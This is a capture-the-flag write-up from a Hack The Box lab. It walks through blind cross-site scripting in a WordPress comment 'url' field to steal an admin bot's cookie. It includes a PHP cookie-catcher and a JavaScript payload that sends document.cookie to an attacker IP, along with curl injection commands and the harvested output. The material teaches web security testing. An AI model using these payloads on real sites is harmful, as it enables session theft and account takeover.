# Section 10 — Skills Assessment

**Scenario:** WordPress 5.7.2 "Security Blog" with moderated comments. Find blind Cross-Site Scripting (XSS), steal the admin's `flag` cookie.

**Target:** `10.129.96.115` (HTB VPN), path `/assessment/`

---

## Reconnaissance

The site is WordPress 5.7.2 with a comment form on the welcome post. Note in the post body:

> "comments must be approved by an admin, so submitting them may take a few seconds."

→ Blind XSS via comment moderation queue. The admin (bot) loads pending comments in `wp-admin/edit-comments.php`, which renders submitted data — that's where the payload fires.

### Comment form fields

```html
<form action="http://10.129.96.115/assessment/wp-comments-post.php" method="post">
  <textarea name="comment">...</textarea>
  <input name="author">    <!-- Name -->
  <input name="email">
  <input name="url">       <!-- Website -->
  <input name="comment_post_ID" value="8" type="hidden">
  <input name="comment_parent" value="0" type="hidden">
</form>
```

---

## Step 1 — Listener

```bash
mkdir -p /tmp/xss_final && cd /tmp/xss_final

cat > index.php << 'EOF'
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("/tmp/xss_final/cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
EOF

cat > script.js << 'EOF'
new Image().src='http://10.10.17.176:8080/index.php?c='+document.cookie
EOF

php -S 0.0.0.0:8080 &
```
> Creates the cookie-catcher PHP page plus the `script.js` exfil payload and starts a background PHP server on port 8080 — swap the attacker IP:port for your tun0 address.

---

## Step 2 — Probe Each Field

Unique callback path per field. The breakout pattern `"><script src=...></script>` works on most WordPress text fields, but the `url` field needs an `http://` prefix to pass URL validation:

```bash
curl -sk -X POST "http://10.129.96.115/assessment/wp-comments-post.php" \
  --data-urlencode 'comment="><script src=http://10.10.17.176:8080/F1_comment></script>' \
  --data-urlencode 'author="><script src=http://10.10.17.176:8080/F2_author></script>' \
  --data-urlencode "email=alice@test.com" \
  --data-urlencode 'url=http://x"><script src=http://10.10.17.176:8080/F3_url></script>' \
  --data-urlencode "submit=Post Comment" \
  --data-urlencode "comment_post_ID=8" \
  --data-urlencode "comment_parent=0"
```
> Submits a comment with unique probe payloads in each field. Each `<script src=...>` uses a different URL path so your listener can identify which field triggered. Replace `10.10.17.176:8080` with your tun0 IP and listener port.

Wait ~3-5 minutes for the admin bot's cron to load the comment queue. Listener output:

```
10.129.96.115:53178 [200]: GET /F3_url
```

→ **`url` field is vulnerable**. The breakout `http://x"><script src=...></script>` exits the `<a href="...">` rendering in the admin's pending-comments table.

> Why only `url` fired: WordPress's `wp_kses()` strips `<script>` from comment body and author name fields. The `url` field is sanitized differently (validated as a URL pattern + `esc_attr`) — but the rendering in older WP versions concatenates the value into the `href` attribute, allowing attribute-based injection if the value contains `"` to break out.

---

## Step 3 — Cookie-Stealing Payload

Same breakout, but pointing to `script.js`:

```bash
curl -sk -X POST "http://10.129.96.115/assessment/wp-comments-post.php" \
  --data-urlencode "comment=Nice post!" \
  --data-urlencode "author=Bob" \
  --data-urlencode "email=bob@test.com" \
  --data-urlencode 'url=http://x"><script src=http://10.10.17.176:8080/script.js></script>' \
  --data-urlencode "submit=Post Comment" \
  --data-urlencode "comment_post_ID=8" \
  --data-urlencode "comment_parent=0"
```
> Submits the real attack payload. The `url` field loads `script.js` from your listener. When the admin reviews pending comments, their browser fetches and runs the script, sending their cookies back to you.

When the admin views the queue, `script.js` runs and ships `document.cookie` to the listener.

---

## Step 4 — Harvest

`cookies.txt`:
```
Victim IP: 10.129.96.115 | Cookie: wordpress_test_cookie=WP Cookie check
Victim IP: 10.129.96.115 | Cookie:  wp-settings-time-2=1778624332
Victim IP: 10.129.96.115 | Cookie:  flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
```

**Flag:** `HTB{cr055_5173_5cr1p71n6_n1nj4}`

---

## Full Attack Chain

```
1. Recon → WordPress 5.7.2 with moderated comments → blind XSS via admin moderation queue
2. Listener up on attacker:8080 with cookie catcher + script.js
3. Probe per-field with unique callback paths → url field fires
4. Replace probe with cookie-stealer (same breakout)
5. Admin bot views queue → cookies exfiltrated → flag found in document.cookie
```

---

## Exam Notes

- WordPress's `url` (Website) field is a classic blind-XSS sink in older versions — the value flows into `<a href="...">` with insufficient quote escaping
- The breakout for an `href` attribute is `"` — payload `http://x"><script...>` closes the attribute and the tag
- Add a valid `http://` prefix to bypass URL validation — without it, WP rejects the input
- Per-field unique paths is the canonical way to find which field is vulnerable when you have no visibility into the admin panel
- Admin bot in HTB labs usually runs on a 2-5 minute cron — be patient, don't assume failure
- This exact attack pattern has been weaponized against real WordPress installations (CVE patterns up through WP 6.5.2 in 2024)

## Sources

- [Cole Grim — HTB Skills Assessment XSS (Medium)](https://medium.com/@colegrim/htb-skills-assessment-cross-site-scripting-xss-6b9f001bd9bd)
- [0xblank — Cross Site Scripting XSS HTB (Medium)](https://medium.com/@0xblank/cross-site-scripting-xss-htb-8bdad92e3131)
- [HTB Forum — XSS Skills Assessment](https://forum.hackthebox.com/t/cross-site-scripting-xss-skills-assessment/274074)
